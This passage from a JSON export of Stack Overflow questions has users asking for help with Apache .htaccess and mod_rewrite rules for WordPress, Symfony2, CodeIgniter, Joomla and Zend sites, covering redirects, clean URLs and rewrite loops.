BrowserMatch \\bMSIE !no-gzip !gzip-only-text/html\n        BrowserMatch \\bMSI[E] !no-gzip !gzip-only-text/html\n    &lt;/IfModule&gt;\n    &lt;IfModule mod_headers.c&gt;\n        Header append Vary User-Agent env=!dont-vary\n    &lt;/IfModule&gt;\n    &lt;IfModule mod_filter.c&gt;\n        AddOutputFilterByType DEFLATE text/css application/x-javascript text/x-component text/html text/richtext image/svg+xml text/plain text/xsd text/xsl text/xml image/x-icon\n    &lt;/IfModule&gt;\n&lt;/IfModule&gt;\n&lt;FilesMatch \"\\.(css|js|htc|CSS|JS|HTC)$\"&gt;\n    &lt;IfModule mod_headers.c&gt;\n        Header set Pragma \"public\"\n        Header append Cache-Control \"public, must-revalidate, proxy-revalidate\"\n    &lt;/IfModule&gt;\n    FileETag MTime Size\n&lt;/FilesMatch&gt;\n&lt;FilesMatch \"\\.(html|htm|rtf|rtx|svg|svgz|txt|xsd|xsl|xml|HTML|HTM|RTF|RTX|SVG|SVGZ|TXT|XSD|XSL|XML)$\"&gt;\n    &lt;IfModule mod_headers.c&gt;\n        Header set Pragma \"public\"\n        Header append Cache-Control \"public, must-revalidate, proxy-revalidate\"\n    &lt;/IfModule&gt;\n    FileETag MTime Size\n&lt;/FilesMatch&gt;\n&lt;FilesMatch \"\\.(asf|asx|wax|wmv|wmx|avi|bmp|class|divx|doc|docx|eot|exe|gif|gz|gzip|ico|jpg|jpeg|jpe|mdb|mid|midi|mov|qt|mp3|m4a|mp4|m4v|mpeg|mpg|mpe|mpp|otf|odb|odc|odf|odg|odp|ods|odt|ogg|pdf|png|pot|pps|ppt|pptx|ra|ram|svg|svgz|swf|tar|tif|tiff|ttf|ttc|wav|wma|wri|xla|xls|xlsx|xlt|xlw|zip|ASF|ASX|WAX|WMV|WMX|AVI|BMP|CLASS|DIVX|DOC|DOCX|EOT|EXE|GIF|GZ|GZIP|ICO|JPG|JPEG|JPE|MDB|MID|MIDI|MOV|QT|MP3|M4A|MP4|M4V|MPEG|MPG|MPE|MPP|OTF|ODB|ODC|ODF|ODG|ODP|ODS|ODT|OGG|PDF|PNG|POT|PPS|PPT|PPTX|RA|RAM|SVG|SVGZ|SWF|TAR|TIF|TIFF|TTF|TTC|WAV|WMA|WRI|XLA|XLS|XLSX|XLT|XLW|ZIP)$\"&gt;\n    &lt;IfModule mod_headers.c&gt;\n        Header set Pragma \"public\"\n        Header append Cache-Control \"public, must-revalidate, proxy-revalidate\"\n    &lt;/IfModule&gt;\n    FileETag MTime Size\n&lt;/FilesMatch&gt;\n# END W3TC Browser Cache\n\n# BEGIN W3TC Page Cache core\n&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n    RewriteRule ^(.*\\/)?w3tc_rewrite_test$ $1?w3tc_rewrite_test=1 [L]\n    RewriteCond %{HTTP_USER_AGENT} (240x320|2\\.0\\ mmp|\\bppc\\b|alcatel|amoi|asus|au\\-mic|audiovox|avantgo|benq|bird|blackberry|blazer|cdm|cellphone|danger|ddipocket|docomo|dopod|elaine/3\\.0|ericsson|eudoraweb|fly|haier|hiptop|hp\\.ipaq|htc|huawei|i\\-mobile|iemobile|j\\-phone|kddi|konka|kwc|kyocera/wx310k|lenovo|lg|lg/u990|lge\\ vx|midp|midp\\-2\\.0|mmef20|mmp|mobilephone|mot\\-v|motorola|netfront|newgen|newt|nintendo\\ ds|nintendo\\ wii|nitro|nokia|novarra|o2|openweb|opera\\ mobi|opera\\.mobi|palm|panasonic|pantech|pdxgw|pg|philips|phone|playstation\\ portable|portalmmm|proxinet|psp|qtek|sagem|samsung|sanyo|sch|sec|sendo|sgh|sharp|sharp\\-tq\\-gx10|small|smartphone|softbank|sonyericsson|sph|symbian|symbian\\ os|symbianos|toshiba|treo|ts21i\\-10|up\\.browser|up\\.link|uts|vertu|vodafone|wap|willcome|windows\\ ce|windows\\.ce|winwap|xda|zte) [NC]\n    RewriteRule .* - [E=W3TC_UA:_low]\n    RewriteCond %{HTTP_USER_AGENT} (acer\\ s100|android|archos5|blackberry9500|blackberry9530|blackberry9550|blackberry\\ 9800|cupcake|docomo\\ ht\\-03a|dream|htc\\ hero|htc\\ magic|htc_dream|htc_magic|incognito|ipad|iphone|ipod|kindle|lg\\-gw620|liquid\\ build|maemo|mot\\-mb200|mot\\-mb300|nexus\\ one|opera\\ mini|samsung\\-s8000|series60.*webkit|series60/5\\.0|sonyericssone10|sonyericssonu20|sonyericssonx10|t\\-mobile\\ mytouch\\ 3g|t\\-mobile\\ opal|tattoo|webmate|webos) [NC]\n    RewriteRule .* - [E=W3TC_UA:_high]\n    RewriteCond %{HTTP_COOKIE} w3tc_referrer=.*(google\\.com|yahoo\\.com|bing\\.com|ask\\.com|msn\\.com) [NC]\n    RewriteRule .* - [E=W3TC_REF:_search_engines]\n    RewriteCond %{HTTPS} =on\n    RewriteRule .* - [E=W3TC_SSL:_ssl]\n    RewriteCond %{SERVER_PORT} =443\n    RewriteRule .* - [E=W3TC_SSL:_ssl]\n    RewriteCond %{HTTP:Accept-Encoding} gzip\n    RewriteRule .* - [E=W3TC_ENC:_gzip]\n    RewriteCond %{REQUEST_METHOD} !=POST\n    RewriteCond %{QUERY_STRING} =\"\"\n    RewriteCond %{HTTP_HOST} =www.example.com\n    RewriteCond %{REQUEST_URI} \\/$ [OR]\n    RewriteCond %{REQUEST_URI} (sitemap\\.xml(\\.gz)?) [NC]\n    RewriteCond %{REQUEST_URI} !(\\/wp-admin\\/|\\/xmlrpc.php|\\/wp-(app|cron|login|register|mail)\\.php|wp-.*\\.php|index\\.php) [NC,OR]\n    RewriteCond %{REQUEST_URI} (wp\\-comments\\-popup\\.php|wp\\-links\\-opml\\.php|wp\\-locations\\.php) [NC]\n    RewriteCond %{HTTP_COOKIE} !(comment_author|wp\\-postpass|wordpress_\\[a\\-f0\\-9\\]\\+|wordpress_logged_in) [NC]\n    RewriteCond %{HTTP_USER_AGENT} !(W3\\ Total\\ Cache/0\\.9\\.2\\.4) [NC]\n    RewriteCond \"%{DOCUMENT_ROOT}/wp-content/w3tc/pgcache/%{REQUEST_URI}/_index%{ENV:W3TC_UA}%{ENV:W3TC_REF}%{ENV:W3TC_SSL}.html%{ENV:W3TC_ENC}\" -F\n    RewriteRule .* \"/wp-content/w3tc/pgcache/%{REQUEST_URI}/_index%{ENV:W3TC_UA}%{ENV:W3TC_REF}%{ENV:W3TC_SSL}.html%{ENV:W3TC_ENC}\" [L]\n    RewriteCond %{REQUEST_METHOD} !=POST\n    RewriteCond %{QUERY_STRING} =\"\"\n    RewriteCond %{HTTP_HOST} =www.example.com\n    RewriteCond %{REQUEST_URI} \\/$ [OR]\n    RewriteCond %{REQUEST_URI} (sitemap\\.xml(\\.gz)?) [NC]\n    RewriteCond %{REQUEST_URI} !(\\/wp-admin\\/|\\/xmlrpc.php|\\/wp-(app|cron|login|register|mail)\\.php|wp-.*\\.php|index\\.php) [NC,OR]\n    RewriteCond %{REQUEST_URI} (wp\\-comments\\-popup\\.php|wp\\-links\\-opml\\.php|wp\\-locations\\.php) [NC]\n    RewriteCond %{HTTP_COOKIE} !(comment_author|wp\\-postpass|wordpress_\\[a\\-f0\\-9\\]\\+|wordpress_logged_in) [NC]\n    RewriteCond %{HTTP_USER_AGENT} !(W3\\ Total\\ Cache/0\\.9\\.2\\.4) [NC]\n    RewriteCond \"%{DOCUMENT_ROOT}/wp-content/w3tc/pgcache/%{REQUEST_URI}/_index%{ENV:W3TC_UA}%{ENV:W3TC_REF}%{ENV:W3TC_SSL}.xml%{ENV:W3TC_ENC}\" -F\n    RewriteRule .* \"/wp-content/w3tc/pgcache/%{REQUEST_URI}/_index%{ENV:W3TC_UA}%{ENV:W3TC_REF}%{ENV:W3TC_SSL}.xml%{ENV:W3TC_ENC}\" [L]\n&lt;/IfModule&gt;\n# END W3TC Page Cache core\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n</code></pre>\n\n<p>The question is, how to add a slash to my home page? Fyi, currently each of my posts and pages url has it.\nI manage to change Setting -> General -> site url, but it didnt work out. Every time I hit the submit button to change the site url to www.example.com/, it reversed back to www.example.com.</p>\n\n<p>Note:\nI'd change the last section of mod_rewrite.c to :</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^.*[^/]$ /$0/ [L,R=301]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>But it didnt work. My images seem didnt find the correct path.\nThank you for any suggestion.</p>\n"},{"tags":["php",".htaccess","symfony2"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2302,"score":1,"question_id":9669458,"title":"How to remove \"web/app_dev.php\" from Symfony2 URLs?","body":"<p>I just created my first Symfony2 project. But the \"/web/app_dev.php\" part in the URL annoys me. It should be possible to do this <em>without</em> Virtual hosts... </p>\n\n<p>But when I try this through .htaccess I always get routing errors and the \"web/\" is always added to the url...</p>\n\n<p>EDIT: The whole project is also in a subdirectory named \"symfonyTest\". The Url to the demo page is \"http://localhost/symfonyTest/web/app_dev.php/demo/\" and it should become \"http://localhost/symfonyTest/demo/\". Links should also have this syntax. Is this possible?</p>\n"},{"tags":["wordpress",".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12656435,"title":"htaccess on wordpress network site","body":"<p>I have been tearing my hair out trying to solve an issue with htaccess on wordpress network site and i've gained so much information from stackoverflow in the past that i thought this would be the best place to ask. And apologies up front if im not posting correctly, it my first time.</p>\n\n<p>here are the specifics of my setup (i cannot show or allow access to the site as i have agreed to an NDA of sorts)</p>\n\n<ol>\n<li>there are 2 sites. the first is the root site \"/\" and the second is \"/mythoughts/\" as shown in network admin.</li>\n<li>the \"/mythoughts/\" site is a replacement for an old custom blog someone built that uses variables in the url (custom)</li>\n<li>the themes i am using are twentyten and roots (obviously roots doesnt do tidy url rewrites as its on a network setup)</li>\n</ol>\n\n<p>the problem is this.</p>\n\n<p>first \"index.php is being removed from the url (its not a problem, but i think it might cause problems when i try to do other rewrites.)</p>\n\n<p>second, the old site has variables in the urls in 2 instances.</p>\n\n<p>the first instance is this</p>\n\n<pre><code>www.thesite.com/mythoughts/index.php?year=2010&amp;month=9\n</code></pre>\n\n<p>which i need to rewrite as </p>\n\n<pre><code>www.thesite.com/mythoughts/2010/9\n</code></pre>\n\n<p>first of all the index.php is automatically removed</p>\n\n<p>i have tried so many different things like</p>\n\n<pre><code>RewriteRule ^mythoughts/index.php?year=(.*)&amp;month=(.*)$ mythoughts/$1/$2 [R=301,L]\n</code></pre>\n\n<p>does not work</p>\n\n<p>the second instance is this</p>\n\n<pre><code>www.thesite.com/mythoughts/index.php?thought=101\n</code></pre>\n\n<p>which should rewrite to</p>\n\n<pre><code>www.thesite.com/mythoughts/title-of-the-post\n</code></pre>\n\n<p>i have a script that can match the url variable to the title of the post (and replace remove illegal characters) but the rewrites just do not work.</p>\n\n<p>here is the htaccess i currently have (a bare wordpress)</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\n\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\n\n# uploaded files\nRewriteRule ^([_0-9a-zA-Z-]+/)?files/(.+) wp-includes/ms-files.php?file=$2 [L]\n\n# add a trailing slash to /wp-admin\nRewriteRule ^([_0-9a-zA-Z-]+/)?wp-admin$ $1wp-admin/ [R=301,L]\n\nRewriteCond %{REQUEST_FILENAME} -f [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^ - [L]\nRewriteRule  ^[_0-9a-zA-Z-]+/(wp-(content|admin|includes).*) $1 [L]\nRewriteRule  ^[_0-9a-zA-Z-]+/(.*\\.php)$ $1 [L]\n    RewriteRule . index.php [L]\n\n\n\n&lt;/IfModule&gt;\n\n#END WordPress\n</code></pre>\n\n<p>if anyone can help in pointing me in the right direction on this whole htaccess thing (which i have been struggling with for the last few weeks) i would be totally greatful.</p>\n\n<p>thanks in advance guys and girls.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","rewrite"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":12660774,"title":"htaccess Rewrite to same name file in different folders of site","body":"<p>I tried to search a lot but got no success. I wish that someone could really help me out with this.</p>\n\n<p>Ok, so my website is like:</p>\n\n<pre><code>/rewrite.php\n/folder1/rewrite.php\n/folder2/rewrite.php\n/folder1/subfolder1/rewrite.php\n/folder1/subfolder2/rewrite.php\n</code></pre>\n\n<p>and so on...</p>\n\n<p>In short, there exist a <strong>rewrite.php</strong> in each and every folder(except admin access folder).</p>\n\n<p>So basically, I want to rewrite to the rewrite.php file in the corresponding directory, but I am not able to do it.</p>\n\n<p>That is</p>\n\n<p>If I request</p>\n\n<pre><code>/News\n</code></pre>\n\n<p>then it should rewrite it to:</p>\n\n<pre><code>/rewrite.php\n</code></pre>\n\n<p>If I request:</p>\n\n<pre><code>/folder1/News\n</code></pre>\n\n<p>then it should rewrite it to:</p>\n\n<pre><code>/folder1/rewrite.php\n</code></pre>\n\n<p>and so on for other folders.</p>\n\n<p>Currently, this is what I have in my htaccess:</p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule . rewrite.php [L,NC]\n</code></pre>\n\n<p>Somewhere, I read that If I remove RewriteBase, then it uses the current directory as RewriteBase. But it failed and didn't worked.</p>\n\n<p>Also, I would like to keep some folders in exceptions(in which Rewriting should be disabled) like:</p>\n\n<pre><code>/administration\n/config\n</code></pre>\n\n<p>I hope for a feasible solution, if anyone can help me... :)</p>\n\n<p>Best Regards,</p>\n\n<p>Ankur Thakur</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting","clean-urls"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12661287,"title":"htaccess clean URL's what's the best way to do it?","body":"<p>I'm working on clean Url's for my website and I noticed that what you find on the internet is pretty much about rewriting your clean urls to the url that your server can work with. So something like this: </p>\n\n<pre><code>www.domain.com/profile/username --&gt; www.domain.com/profile.php?u=username\n\nRewriteEngine On\nRewriteRule ^profile/(.*)$ /profile.php?u=$1 [L]\n</code></pre>\n\n<p>So now with this I should link within my website to the cleanurl's. But intuitively it feels more solid/better to link to the 'dirty' url. So in that case you should use rewriterules for the above AND a redirect rule to rederict the 'dirty url' to the clean url, so the user only sees the clean url in the browser at all time.</p>\n\n<pre><code>www.domain.com/profile.php?u=username --&gt; www.domain.com/profile/username\n</code></pre>\n\n<p>Is this something that is a good thing to do. Is it done by websites? What are arguments against/ in favour of it?</p>\n\n<p>And how do you do you do a redirect like this. Something like the following doesn't seem to work:</p>\n\n<pre><code>RewriteRule ^profile\\.php?u=(.*)$ /profile/$1 [R=301, L]\n</code></pre>\n\n<p>I'm fairly new to .htaccess so I might ask for something that's obvious...</p>\n"},{"tags":[".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12660519,"title":"My url rewrite redirects to mydomain.com/var/www/clients/client3/web25/","body":"<p>I'm trying to make a rewrite of a url on my joomla site. I have an extra page in there wiht some other stuff on it.</p>\n\n<p>I have:</p>\n\n<pre><code>RewriteRule ^company/([^/]+) company?alias=$1 [NC]\n</code></pre>\n\n<p>where i want company/somecompany to show what the url company?alias=somecompany will give (not forward to it).</p>\n\n<p>What i get instead is a redirection to:</p>\n\n<p><a href=\"http://www.mydomain.dk/var/www/clients/client2/web5/web/company?alias=somecompany\" rel=\"nofollow\">http://www.mydomain.dk/var/www/clients/client2/web5/web/company?alias=somecompany</a></p>\n\n<p>Also if i include a \"-\" like \"company/some-company\" it skips my rewrite and just goes to the joomla rewrite rules (and can't find the article)</p>\n\n<p>What am I doing wrong?</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12659949,"title":"How To Use 301 Redirect In htaccess To Stop 404 Errors?","body":"<p>I've two domains with same name but different TLD like .com and .net.\ni'm using blog on \".com\" domain and forum on \".net\" domains like</p>\n\n<p>Sites 1: \"http://www.mywebsite.com/\" (blog)\nSite 2: \"http://www.mywebsite.net/forum\" (forum)</p>\n\n<p>I'm facing problem with Google webmaster tool, webmaster tool trying to crawle my .com domain as forum hosted like \"www.mydomain.com/forum\" however forum not exist on .com domain. its exist on .net domain. so its generate 404 errors.</p>\n\n<p>Please, let me know some code to to redirect \".com/forum/ {Plus Queries} /\" to exact \".net/forum/{ Destination }\" i believe its help to mark remove 404 errors or help to prevent more errors.</p>\n\n<p>however, today I've set my robots.txt to disable Google crawling on \".com/forum\"</p>\n"},{"tags":["windows","linux",".htaccess","mod-rewrite","ubuntu"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12657401,"title":"Mod_rewrite has different result on Windows and Ubuntu","body":"<p>I have set the following rewrite rule</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ core/index.php [L]\n</code></pre>\n\n<p>and the site architecture is</p>\n\n<pre><code>newsite\n ﹂ .htaccess\n ﹂ core\n     ﹂ index.php\n</code></pre>\n\n<p>If I use the url: <strong>http:// localhost/web/newsite/test</strong> on Windows<br />\nit will redirect to <strong>/web/newsite/core/index.php</strong><br />\nand it work!<br />\n<br />\nbut if use the url <strong>http:// localhost/~user1/web/newsite/test</strong> on Ubuntu<br />\nit will redirect to <strong>/home/user1/public_html/web/newsite/core/index.php</strong><br />\nnot <strong>/~user1/web/newsite/core/index.php</strong><br />\n<br />\nSo, how can I solve this problem?<br />\nThanks!</p>\n"},{"tags":[".htaccess","wildcard","http-status-code-301"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12363852,"title":"I need to do specific 301s as well as wild card/catch all. How do I do it?","body":"<p>Regarding .htaccess:</p>\n\n<p>I've got a site I'm closing down. It's got thousands of urls, most dynamic, that does not translate well to my new site, as the structure is completely different. </p>\n\n<p>My .htaccess has about two hundred (the most important ones) URLs 301'ed (manually) to my new site. This I want to follow with a rule that sends every other url, except the ones I did manually, to the landing page of my new site. I cannot get anything to work, as the catchall i've tried ignore the manual 301s. </p>\n\n<p>Can anyone kindly help me out with a rule? </p>\n\n<p>Best regards, \nSK</p>\n"},{"tags":["php",".htaccess","redirect","request","http-status-code-404"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12663519,"title":"Understandin PHP 404 redirection related to invalid get request","body":"<p>Ok, am using traditional php, no frameworks, nothing, I am using simple procedural way, now my question is I was searching for a while but am not getting an answer to my question, I am not using .htaccess files as of now, but I really need to understand how 404 error works? I am having a website, where I show post's related to category, say category=php, so I pass this as a get request</p>\n\n<pre><code>$_GET['category'] == 'php';\n</code></pre>\n\n<p>Now currently what am doing is something like this :</p>\n\n<pre><code>$pocategory = $_GET['category'];\n\nif($pocategory == 'php' || $pocategory == 'javascript') {\n//Then show related posts\n} else {\nheader('Location:404.php');\nexit;\n}\n</code></pre>\n\n<p>I mean I just want php and javascript as valid request's value, rest I want to redirect to 404 but am not understanding how to do it so I did this way, what if am having more than 50 categories? I cant list them all in this if condition, Inshort how to detect whether the given get request value is invalid or not..</p>\n\n<p>Any help will be much appreciated.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","url-rewriting","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12411860,"title":"URL Path Rewriting","body":"<p>Maybe this has been answered before, I can't seem to get any thing to work. I am new to rewriting.</p>\n\n<p>What I have is this, <a href=\"http://www.domain.com/path1/path2/path3/page\" rel=\"nofollow\">http://www.domain.com/path1/path2/path3/page</a></p>\n\n<p>What I want is to remove only path2 from the url, so the result will be <a href=\"http://www.domain.com/path1/path3/page\" rel=\"nofollow\">http://www.domain.com/path1/path3/page</a></p>\n\n<p>How can I achieve this without redirecting?</p>\n\n<p>This is currently what I have:</p>\n\n<p><code>RewriteRule ^/([A-Za-z0-9-]+)/([A-Za-z0-9-]+)/([A-Za-z0-9-]+)$ $1/$3 [L]</code></p>\n\n<p>This is located in my vhost file.</p>\n\n<p>Thanks!</p>\n"},{"tags":["php","regex",".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12329323,"title":".htaccess rewrite rule break string on first & operator","body":"<p>this is my code</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^public/p-(.*)\\&amp;(.*)?$ public/index.php?page=$1.php&amp;$2 [NC,L] \nRewriteRule ^public/p-(.*)$ public/index.php?page=$1.php\n</code></pre>\n\n<p>This is the URL</p>\n\n<pre><code>http://localhost/riviera/public/p-job-steps&amp;job_id=7&amp;step=1\n</code></pre>\n\n<p>Output is</p>\n\n<pre><code>Array ( [page] =&gt; job-steps [job_id] =&gt; 7.php [step] =&gt; 1 ) \n</code></pre>\n\n<p>I just want to append \".php\" to first parameter</p>\n\n<p>I wasted my 4-5 hours in achieving this target and I do not want to modify url structure of app I'm building. \nPlease help someone!</p>\n"},{"tags":[".htaccess","url-rewriting","mediawiki"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12660966,"title":"RewriteRule from Main Page","body":"<p>Please help with  setting/config of .htaccess file.</p>\n\n<p>How to Rewriterule from address <a href=\"http://domain.com/main_page\" rel=\"nofollow\">http://domain.com/main_page</a> to <a href=\"http://domain.com\" rel=\"nofollow\">http://domain.com</a> ?</p>\n\n<p>What i do or my .htaccess file:</p>\n\n<pre><code>RewriteEngine on\nOptions +FollowSymLinks\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n</code></pre>\n\n<p>I tried <code>RewriteRule ^$ /Main_Page</code> but it doesnt work.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12660019,"title":".htaccess Causes Internal Server Error on Rewrite of URL","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1611506/request-exceeded-the-limit-of-10-internal-redirects-due-to-probable-configuratio\">Request exceeded the limit of 10 internal redirects due to probable configuration error.?</a>  </p>\n</blockquote>\n\n\n\n<p>Update: after changes .htaccess looks like</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^([^/]*)$ /url.php?uri=$1 [L]\n</code></pre>\n\n<p>Earlier Changes Before Update: I added below line in my \".htaccess\", and got 500 Internal Server Error.</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^([^/]*)$ /url.php?uri=$1 [L]\n</code></pre>\n\n<p>I Could not Understand What Went wrong, When I saw my Error Log File.\nI see this :-</p>\n\n<blockquote>\n  <p>Request exceeded the limit of 10 internal redirects due to probable\n  configuration error. Use 'LimitInternalRecursion' to increase the\n  limit if necessary. Use 'LogLevel debug' to get a backtrace.</p>\n</blockquote>\n\n<p>I google few Minutes, searched stackOverflow about same error, Could not Understand, What i was missing...</p>\n\n<p>Currently I am reading about \"LimitInternalRecursion\" to get quick fix.</p>\n\n<p>Need Tips to Fix it.</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":12346338,"title":"Redirect .htm to .php under same domain along with get value","body":"<p>My site hosted on linux. My four domains and some subdomains parked on root directory. Now I have changed all <em>.htm</em> files as <em>.php</em>. When I tried to redirect </p>\n\n<p>with <em>.htaccess</em> by adding the matter <code>RewriteRule ^(.*)\\.htm$ $1.php [r=301,nc]</code> on it, it does not bring get values. I want to redirect all <em>.htm</em> to <em>.php</em> on same domain along with get value. I am tired to find matching code before posting this question. Kindly help me.</p>\n\n<p>With thanks and regards,\nLeelakh Ran.</p>\n"},{"tags":[".htaccess","codeigniter","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12278652,"title":".htaccess multiple rewrite rules for codeigniter","body":"<p>I want to ask how can we add an additional rewrite rule(s) in .htaccess file including the index.php removal rule in codeigniter.</p>\n\n<p>Here is my .htaccess file</p>\n\n<pre><code>RewriteEngine on\n\nRewriteCond $1 !^(index\\.php|images|robots\\.txt)\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteRule ^profile/([0-9]+)$ /index.php/front/profileDetail/$1\nRewriteRule ^(.*)$ /index.php/$1\n</code></pre>\n\n<p>The problem is that, only one of the rule works at a time. If I save the file as shown above it returns internal server error!</p>\n\n<p>What I want is completely remove index.php file plus rewrite the url from  xyz.com/front/profileDetail/50 into xyz.com/profile/50</p>\n\n<p>Please help what's wrong, I am completely newbie in this regard.</p>\n\n<p>Thanks! in advance.</p>\n"},{"tags":["php",".htaccess","mod-rewrite","url-rewriting"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12549526,"title":"How to correct this rewrite rule?","body":"<p>I have url as\n <code>http://www.mydomain.com/levels/home?mode=48bb6e862e54f2a795ffc4e541caed5c</code>. I need to change this url to <code>http://www.mydomain.com/medium</code>. \nI am not familiar with rewrite url.</p>\n\n<p>I tried with <code>RewriteRule ^medium/?$    levels/home?mode=48bb6e862e54f2a795ffc4e541caed5c</code>, but not worked correctly.</p>\n\n<p>Full rewrite rule</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^medium/?$    levels/home?mode=48bb6e862e54f2a795ffc4e541caed5c\nRewriteRule ^(.*)$ index.php [QSA,L]\n</code></pre>\n"},{"tags":["php","mysql",".htaccess","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12656796,"title":"URL string does not return in MySQL query","body":"<p>I try to query a series of rows in my MySQL database but whenever the value is a URL it does not display.</p>\n\n<pre><code>([Handle] =&gt; air-gap-parts \n [productID] =&gt; 0000000018 \n [active] =&gt; 1 \n [tag] =&gt; 0 \n [ImageSrc] =&gt;) \n</code></pre>\n\n<p>ImageSrc should yield a URL to a picture but every time it returns nothing. I'm using CodeIgniter and I am wondering if it has something to do with my .htaccess file?</p>\n\n<p>.htaccess file:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L] \n\n&lt;Files \"index.php\"&gt;\n  AcceptPathInfo On\n&lt;/Files&gt;\n</code></pre>\n\n<p>CodeIgniter Model Query:</p>\n\n<pre><code>function get_product_pics($handle)&lt;br /&gt;\n{\n  $this-&gt;db-&gt;where('handle', $handle);\n  $query = $this-&gt;db-&gt;get('products_test_db');\n  return $query-&gt;result();\n}\n</code></pre>\n\n<p>Thank you very much for your help!</p>\n"},{"tags":[".htaccess","zend-framework","deployment","webserver","web-deployment"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":79,"score":2,"question_id":12319346,"title":"Zend App is not working after deployment. Can access only the homepage","body":"<p>I can access the homepage and can get the data from the database. There everything seems OK. But when I try to go to another page from my application I am redirected to <code>404 error page</code>. The URL which is showing at the bottom left corner on my browser when hover the link seems ok.  It is as should be. </p>\n\n<p>I tried to change the <code>.htaccess</code> file on the server from: </p>\n\n<pre><code># Do not remove this line, otherwise mod_rewrite rules will stop working\n\nRewriteBase /\n</code></pre>\n\n<p>To: </p>\n\n<pre><code># Do not remove this line, otherwise mod_rewrite rules will stop working\n\nRewriteBase /\n\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ - [NC,L]\nRewriteRule ^.*$ index.php [NC,L]\n</code></pre>\n\n<p>But it fails again. Tried different combinations. For example change <code>RewriteBase /</code> to <code>RewriteBase /projectname/public/</code> or <code>RewriteBase /projectname/</code>. Still no success. </p>\n\n<p>Of course, I am not sure if the <code>.htaccess</code> is the problem. May be something different but I have no idea what...</p>\n\n<p>On localhost the application is working and everything is OK there. </p>\n\n<p><strong>Edit:</strong> After several changes that I try I finally get it working. </p>\n\n<h2><em><strong>Here is the solution:</em></strong></h2>\n\n<p>I leaved server's .htaccess file as is. So it has only <code>RewriteBase /</code> on it. \nThen on the first line of my .htaccess file (which is in the <code>projectname/public</code> folder) I added this:</p>\n\n<pre><code>RewriteBase /projectname/public\n</code></pre>\n\n<p>Now everything is working. 